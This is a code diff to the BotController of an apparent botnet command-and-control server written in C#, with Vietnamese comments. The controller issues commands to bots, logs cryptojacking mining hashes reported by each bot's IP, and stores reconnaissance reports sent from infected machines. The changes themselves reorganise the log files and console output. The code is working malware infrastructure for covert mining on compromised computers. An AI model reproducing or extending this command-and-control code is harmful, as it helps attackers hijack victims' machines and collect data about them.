@@ -58,7 +58,31 @@ namespace CncServer.Controllers
         private static string _command = "idle";
         //private static readonly ConcurrentBag<CryptoJackResult> _results = new ConcurrentBag<CryptoJackResult>();
         private static readonly object _fileLock = new object();
-        private const string LogFileName = "mined_hashes.txt";
+
+        private const string LogFolder = "log";
+        private const string MinedHashesFileName = "mined_hashes.txt";
+        private const string ReconFilePrefix = "recon_";
+
+        // === Constructor: Tự động tạo folder log khi khởi động ===
+        static BotController()
+        {
+            try
+            {
+                if (!Directory.Exists(LogFolder))
+                {
+                    Directory.CreateDirectory(LogFolder);
+                    Console.ForegroundColor = ConsoleColor.Cyan;
+                    Console.WriteLine($"[INIT] Created log folder at: {Path.GetFullPath(LogFolder)}");
+                    Console.ResetColor();
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine($"[ERROR] Failed to create log folder: {ex.Message}");
+                Console.ResetColor();
+            }
+        }
 
         // Hàm helper để lấy IP của Bot
         private string GetBotIp()
@@ -207,11 +231,12 @@ namespace CncServer.Controllers
             try
             {
                 // Format log dễ parse: [Time]|IP|Nonce|Hash
+                string logFilePath = Path.Combine(LogFolder, MinedHashesFileName);
                 string logEntry = $"{result.Timestamp:O}|{result.BotIp}|{result.Nonce}|{result.Hash}";
 
                 lock (_fileLock)
                 {
-                    System.IO.File.AppendAllText(LogFileName, logEntry + Environment.NewLine);
+                    System.IO.File.AppendAllText(logFilePath, logEntry + Environment.NewLine);
                 }
             }
             catch (Exception ex)
@@ -230,12 +255,13 @@ namespace CncServer.Controllers
         public IActionResult GetResults()
         {
             var results = new List<CryptoJackResult>();
+            string logFilePath = Path.Combine(LogFolder, MinedHashesFileName);
 
             lock (_fileLock)
             {
-                if (System.IO.File.Exists(LogFileName))
+                if (System.IO.File.Exists(logFilePath))
                 {
-                    var lines = System.IO.File.ReadAllLines(LogFileName);
+                    var lines = System.IO.File.ReadAllLines(logFilePath);
                     foreach (var line in lines)
                     {
                         try
@@ -273,22 +299,41 @@ namespace CncServer.Controllers
 
             // Tạo tên file riêng cho từng bot: recon_IP_Time.txt
             // Thay thế dấu : trong IP (nếu là IPv6) để tránh lỗi tên file
-            string safeIp = ip.Replace(":", "_");
-            string fileName = $"recon_{safeIp}_{timestamp}.txt";
+            string safeIp = ip.Replace(":", "_").Replace(".", "_");
+            //string fileName = $"recon_{safeIp}_{timestamp}.txt";
+            string fileName = Path.Combine(LogFolder, $"{ReconFilePrefix}{safeIp}.txt");
 
             Console.ForegroundColor = ConsoleColor.Magenta;
-            Console.WriteLine($"[RECON] Received report from {ip}. Saving to {fileName}...");
+
+            bool fileExists = System.IO.File.Exists(fileName);
+
+            if (fileExists)
+            {
+                Console.WriteLine($"[RECON] Updating report from {ip} -> {fileName}");
+            }
+            else
+            {
+                Console.WriteLine($"[RECON] Received NEW report from {ip} -> {fileName}");
+            }
             Console.ResetColor();
+
 
             try
             {
                 // Lưu file vào thư mục chạy của Server
                 System.IO.File.WriteAllText(fileName, payload.Report);
+
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine($"[SUCCESS] Recon report saved/updated at {DateTime.Now:HH:mm:ss}");
+                Console.ResetColor();
+
                 return Ok("Recon report saved.");
             }
             catch (Exception ex)
             {
+                Console.ForegroundColor = ConsoleColor.Red;
                 Console.WriteLine($"[ERROR] Save recon file failed: {ex.Message}");
+                Console.ResetColor();
                 return StatusCode(500, "Internal Server Error");
             }
         }
